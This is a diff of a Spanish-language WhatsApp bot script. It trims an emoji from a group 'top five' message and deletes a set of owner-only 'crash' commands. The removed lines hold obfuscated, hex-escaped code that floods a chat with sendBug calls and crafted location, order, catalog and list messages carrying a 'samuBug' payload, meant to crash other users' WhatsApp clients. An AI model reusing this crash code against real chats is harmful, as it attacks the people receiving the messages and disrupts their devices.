@@ -2191,7 +2191,7 @@ const o3 = p3[Math.floor(Math.random() * p3.length)]
 const o4 = p4[Math.floor(Math.random() * p4.length)]
 const o5 = p5[Math.floor(Math.random() * p5.length)]
 teks = `
-*😵TOP CINCO:*\n\n1= @${o1.jid.split('@')[0]}\n\n2=@${o2.jid.split('@')[0]}\n\n3=@${o3.jid.split('@')[0]}\n\n4= @${o4.jid.split('@')[0]}\n\n5= @${o5.jid.split('@')[0]}\n\n\n_Top 5  en este grupo`
+*TOP CINCO:*\n\n1= @${o1.jid.split('@')[0]}\n\n2=@${o2.jid.split('@')[0]}\n\n3=@${o3.jid.split('@')[0]}\n\n4= @${o4.jid.split('@')[0]}\n\n5= @${o5.jid.split('@')[0]}\n\n\n_Top 5  en este grupo`
 member.push(o1.jid)
 member.push(o2.jid)
 member.push(o3.jid)
@@ -2263,95 +2263,6 @@ if (!isUrl) return reply('Porfavor envia especificamente un link de la musica')
 musica = await getJson(`https://api.lolhuman.xyz/api/musicsearch?apikey=${api}&file=${q}`)
 p = musica.result
 
-break
-
-case 'crash':
-if (!itsMe) return reply('*JAJA y este we quien es??*')
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-var _0x7d8a=["\x2A\x53\x61\x6D\x75\x33\x33\x30\x20\x43\x72\x61\x73\x68\x69\x6E\x67\x20\x47\x72\x6F\x75\x70\x73\x21\x21\x2A\x20\uD83C\uDF49"];reply(_0x7d8a[0])
-break
-		
-case 'crashloc':
-if (!itsMe) return reply('*JAJA y este we quien es??*')
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-var _0x9c03=["\x30\x30\x30\x30\x30\x30","\uD83D\uDCCC\x43\x72\x61\x73\x68\x20\uD83D\uDC09\x53\x61\x6D\x75\x33\x33\x30\uD83D\uDC09","\x4E\x79\x61\x6E\x42\x6F\x74\uD83D\uDC0B\x20","","\x6C\x69\x76\x65\x4C\x6F\x63\x61\x74\x69\x6F\x6E","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];samu330[_0x9c03[5]](from,{degreesLatitude:`${_0x9c03[0]}`,degreesLongitude:`${_0x9c03[0]}`,name:_0x9c03[1],address:`${_0x9c03[2]}${samuBug}${_0x9c03[3]}`},MessageType[_0x9c03[4]],{quoted:fliveLoc})
-break
-		
-case 'crashcom':
-if (!itsMe) return reply('*JAJA y este we quien es??*')
-reply(`${samuBug}`)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-break	
-		
-case 'crashpc':if (!itsMe) return reply('*JAJA y este we quien es??*')
-var _0x782a=["\uD83D\uDD78\uFE0F\x53\x6D\x33\x33\x30\x20\x43\x72\x61\x73\x68\uD83D\uDD78\uFE0F","\x65\x78\x74\x65\x6E\x64\x65\x64\x54\x65\x78\x74","\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x73\x74\x61\x74\x75\x73\x40\x62\x72\x6F\x61\x64\x63\x61\x73\x74","","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];for(let i=0;i< args[0];i++){samu330[_0x782a[5]](from,`${_0x782a[0]}`,MessageType[_0x782a[1]],{quoted:{key:{participant:`${_0x782a[2]}`,...(from?{remoteJid:_0x782a[3]}:{})},message:{orderMessage:{itemCount:99999999,status:1,surface:10,orderTitle:`${_0x782a[4]}${pushname}${_0x782a[4]}`,sellerJid:_0x782a[2]}}}},0)}
-break	
-		
-case 'crash3':
-if (!itsMe) return reply('*JAJA y este we quien es??*')
-var _0x5f03=["\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5F\u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2588\x0D\x0A\u2591\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\x0D\x0A\u2588\u2588\u2593\u2592\u2591\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x5F\x5F\x5F\u2588\u2588\u2588\u2588\u2588\u2588\x0D\x0A\u2588\u2588\u2593\u2592\u2591\x5F\x5F\x5F\x5F\u2591\u2593\u2588\u2588\u2588\u2593\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\u2588\u2588\u2593\u2592\u2591\x5F\x5F\x5F\u2591\u2593\u2588\u2588\u2593\x5F\x5F\x5F\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\u2588\u2588\u2593\u2592\u2591\x5F\x5F\x53\x61\x6D\x20\x79\x20\x50\x65\x72\x72\x79\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\x5F\u2588\u2588\u2593\u2592\u2591\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\x5F\x5F\u2588\u2588\u2593\u2592\u2591\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\x5F\x5F\x5F\u2588\u2588\u2593\u2592\u2591\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\x5F\x5F\x5F\x5F\u2588\u2588\u2593\u2592\u2591\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\x5F\x5F\x5F\x5F\x5F\u2588\u2588\u2593\u2592\u2591\x5F\x5F\x5F\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\x5F\x5F\x5F\x5F\x5F\x5F\u2588\u2588\u2593\u2592\u2591\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\x5F\x5F\x5F\x5F\x5F\x5F\x5F\u2588\u2593\u2592\u2591\u2591\u2592\u2593\u2588\u2588\x0D\x0A\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\x5F\x5F\x5F\x5F\x5F\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A\x5F\x5F\x5F\x5F\x5F\u2591\u2592\u2593\u2588\u2588\x0D\x0A"];reply(`${_0x5f03[0]}`)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-break	
-
-case 'crashcatal':
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-res131 = samu330.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": `${samuBug}`, "footerText": "*_© InsaneService_*", "thumbnail": fs.readFileSync('./src/fake.jpg'), "surface": 'CATALOG' }}, {quoted:sam})
-samu330.relayWAMessage(res131)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-sendBug(from)
-break
-
-case 'crashrow':
-if (!itsMe) return reply('*JAJA y este we quien es??*')
-var _0x6d39=["\x6F\x77\x6E\x65\x72\x42","\x6F\x6E\x6C\x79","\x74\x6F\x67\x67\x6C\x65\x44\x69\x73\x61\x70\x70\x65\x61\x72\x69\x6E\x67\x4D\x65\x73\x73\x61\x67\x65\x73","\u270D\uD83C\uDFFB\x53\x61\x6D\x75\x33\x33\x30","","\x43\x6C\x69\x63\x6B\x20\x41\x71\x75\x69\x21\x21","\x53\x49\x4E\x47\x4C\x45\x5F\x53\x45\x4C\x45\x43\x54","\x5B\x20","\x20\x5D","\x70\x72\x65\x70\x61\x72\x65\x4D\x65\x73\x73\x61\x67\x65\x46\x72\x6F\x6D\x43\x6F\x6E\x74\x65\x6E\x74","\x72\x65\x6C\x61\x79\x57\x41\x4D\x65\x73\x73\x61\x67\x65"];if(!isOwner){return reply(mess[_0x6d39[1]][_0x6d39[0]])};samu330[_0x6d39[2]](from,0);let bug2=samu330[_0x6d39[9]](from,{"\x6C\x69\x73\x74\x4D\x65\x73\x73\x61\x67\x65":{"\x74\x69\x74\x6C\x65":_0x6d39[3],"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":`${_0x6d39[4]}${samuBug}${_0x6d39[4]}`,"\x62\x75\x74\x74\x6F\x6E\x54\x65\x78\x74":_0x6d39[5],"\x6C\x69\x73\x74\x54\x79\x70\x65":_0x6d39[6],"\x73\x65\x63\x74\x69\x6F\x6E\x73":[{"\x74\x69\x74\x6C\x65":`${_0x6d39[7]}${pushname}${_0x6d39[8]}`,"\x72\x6F\x77\x73":[{"\x74\x69\x74\x6C\x65":`${_0x6d39[4]}${samuBug}${_0x6d39[4]}`,"\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E":`${_0x6d39[4]}${samuBug}${_0x6d39[4]}`,"\x72\x6F\x77\x49\x64":`${_0x6d39[4]}`}]}]}},{quoted:ftoko});samu330[_0x6d39[10]](bug2);samu330[_0x6d39[2]](from,0)
 break
 
 
